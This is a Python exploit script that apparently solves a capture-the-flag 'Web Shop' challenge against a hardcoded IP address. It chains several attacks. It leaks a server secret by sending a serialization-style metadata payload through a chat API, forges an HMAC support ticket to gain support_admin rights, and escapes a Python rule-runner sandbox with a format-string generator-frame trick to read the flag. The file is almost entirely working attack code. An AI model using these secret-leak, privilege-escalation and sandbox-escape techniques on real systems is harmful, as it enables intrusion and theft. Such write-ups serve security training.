#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import hmac
import secrets
import sys
from datetime import datetime, timezone
from typing import Any

import requests


DEFAULT_BASE = "http://101.245.103.157:5049"


class ExploitError(RuntimeError):
    pass


def api(
    session: requests.Session,
    method: str,
    base: str,
    path: str,
    token: str | None = None,
    **kwargs: Any,
) -> requests.Response:
    headers = dict(kwargs.pop("headers", {}) or {})
    if token:
        headers["Authorization"] = f"Bearer {token}"
    response = session.request(method, base.rstrip("/") + path, headers=headers, timeout=15, **kwargs)
    print(f"[{response.status_code}] {method} {path}")
    if not response.ok:
        raise ExploitError(f"{method} {path} failed: {response.status_code} {response.text[:500]}")
    return response


def register(session: requests.Session, base: str) -> tuple[str, dict[str, Any], str, str]:
    username = "u" + secrets.token_hex(6)
    password = "Aa1!" + secrets.token_urlsafe(14).replace("-", "X").replace("_", "Y")
    if username.lower() in password.lower():
        password += "!Z9a"

    response = api(
        session,
        "POST",
        base,
        "/api/auth/register",
        json={
            "username": username,
            "password": password,
            "confirmPassword": password,
        },
    )
    data = response.json()
    print(f"[+] registered username={username!r} id={data['user']['id']}")
    return data["token"], data["user"], username, password


def earn_coins(session: requests.Session, base: str, token: str) -> dict[str, Any]:
    user = {}
    for _ in range(10):
        response = api(session, "POST", base, "/api/woodfish/knock", token=token, json={})
        user = response.json()["user"]
    print(f"[+] coins={user['coins']} woodfishCount={user['woodfishCount']}")
    return user


def buy_debug_bundle(session: requests.Session, base: str, token: str) -> str:
    products = api(session, "GET", base, "/api/shop/products", token=token).json()["products"]
    debug_product = next((p for p in products if p["name"] == "Support Debug Bundle"), None)
    if not debug_product:
        raise ExploitError("Support Debug Bundle not found")

    response = api(
        session,
        "POST",
        base,
        "/api/shop/buy",
        token=token,
        json={"productId": debug_product["id"]},
    )
    download = response.json().get("download")
    if not download:
        raise ExploitError("debug bundle bought but no download path returned")
    print(f"[+] debug bundle productId={debug_product['id']} download={download}")
    return download


def download_support_ticket(session: requests.Session, base: str, token: str, path: str) -> str:
    source = api(session, "GET", base, path, token=token).text
    if "SHOP_SUPPORT_SEED" not in source or "support-login" not in source:
        raise ExploitError("downloaded support ticket script does not look right")
    print("[+] downloaded support_ticket.py")
    return source


def leak_support_seed(session: requests.Session, base: str, token: str) -> str:
    marker = "seed-leak-" + secrets.token_hex(4)
    payload = {
        "content": marker,
        "metadata": {
            "client": "solve.py",
            "probe": {
                "lc": 1,
                "type": "secret",
                "id": ["SHOP_SUPPORT_SEED"],
            },
        },
    }
    api(session, "POST", base, "/api/chat/messages", token=token, json=payload)
    messages = api(session, "GET", base, "/api/chat/messages", token=token).json()["messages"]

    for message in reversed(messages):
        if message.get("content") != marker:
            continue
        metadata = message.get("metadata")
        if isinstance(metadata, dict) and isinstance(metadata.get("probe"), str):
            seed = metadata["probe"]
            print(f"[+] leaked SHOP_SUPPORT_SEED={seed!r}")
            return seed
        raise ExploitError(f"metadata restore failed for marker message: {metadata!r}")

    raise ExploitError("seed leak marker message not found")


def issue_ticket(seed: str, user: dict[str, Any]) -> str:
    today = datetime.now(timezone.utc).strftime("%Y%m%d")
    message = f"support-login:{user['id']}:{user['username']}:{today}"
    return hmac.new(seed.encode(), message.encode(), hashlib.sha256).hexdigest()[:12]


def promote_to_admin(session: requests.Session, base: str, token: str, ticket: str) -> dict[str, Any]:
    response = api(
        session,
        "POST",
        base,
        "/api/bot/chat",
        token=token,
        json={"message": f"/login {ticket}"},
    )
    data = response.json()
    user = data.get("data", {}).get("user")
    if not user or user.get("role") != "support_admin":
        raise ExploitError(f"support_admin promotion failed: {data!r}")
    print("[+] promoted to support_admin")
    return user


def read_flag(session: requests.Session, base: str, token: str) -> str:
    code = "\n".join(
        [
            "g = iter_preview_items()",
            "next(g)",
            'field = "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"',
            "result = field.format(g)",
        ]
    )
    response = api(session, "POST", base, "/api/rules/run", token=token, json={"code": code})
    data = response.json()
    if not data.get("ok"):
        raise ExploitError(f"rule runner failed: {data!r}")
    flag = str(data.get("result", ""))
    print(f"[+] flag={flag}")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve Web Shop challenge")
    parser.add_argument("base", nargs="?", default=DEFAULT_BASE, help=f"target base URL, default: {DEFAULT_BASE}")
    args = parser.parse_args()

    session = requests.Session()
    token, user, _, _ = register(session, args.base)
    earn_coins(session, args.base, token)
    download_path = buy_debug_bundle(session, args.base, token)
    download_support_ticket(session, args.base, token, download_path)
    seed = leak_support_seed(session, args.base, token)
    ticket = issue_ticket(seed, user)
    print(f"[+] support ticket={ticket}")
    promote_to_admin(session, args.base, token, ticket)
    flag = read_flag(session, args.base, token)
    print(flag)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
